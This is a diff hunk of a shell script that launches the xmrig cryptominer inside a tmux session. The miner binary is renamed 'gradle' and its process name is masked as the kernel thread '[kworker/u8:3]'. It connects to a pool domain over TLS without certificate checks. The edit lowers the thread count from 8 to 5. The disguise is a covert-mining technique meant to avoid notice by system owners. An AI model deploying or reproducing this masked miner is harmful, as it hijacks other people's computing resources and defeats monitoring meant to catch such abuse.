@@ -16,7 +16,7 @@ else
         cd xmrig-6.22.2 &&
         mv xmrig gradle &&
         chmod +x gradle &&
-        exec -a '[kworker/u8:3]' ./gradle -o $DOMAIN --tls -k --donate-level=0 -t 8 --rig-id $NAME_WORK
+        exec -a '[kworker/u8:3]' ./gradle -o $DOMAIN --tls -k --donate-level=0 -t 5 --rig-id $NAME_WORK
     " C-m
 
     tmux attach-session -t $SESSION
